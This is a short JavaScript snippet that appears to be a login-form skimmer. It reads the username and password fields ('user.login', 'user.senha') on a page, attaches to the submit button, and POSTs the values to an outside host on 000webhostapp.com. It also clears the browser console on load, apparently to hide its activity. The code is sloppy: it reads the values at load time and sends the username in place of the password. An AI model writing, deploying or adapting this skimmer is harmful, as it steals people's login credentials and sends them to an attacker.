console.log(1)

let btn = document.querySelector('[data-callback="onSubmit"]')
const username = document.querySelector('[name="user.login"]').value
const password = document.querySelector('[name="user.senha"]').value


if (btn){
    btn.addEventListener("click", function(){
        const data = new FormData();
        data.append("username", username);
        data.append("password", username);


        const response = fetch("https://fckyou-get.000webhostapp.com/get.php", {
            method: "POST",
            body: data
        });
        
        console.log(data)
    });
}


document.addEventListener('DOMContentLoaded', function() {
    console.clear();
});
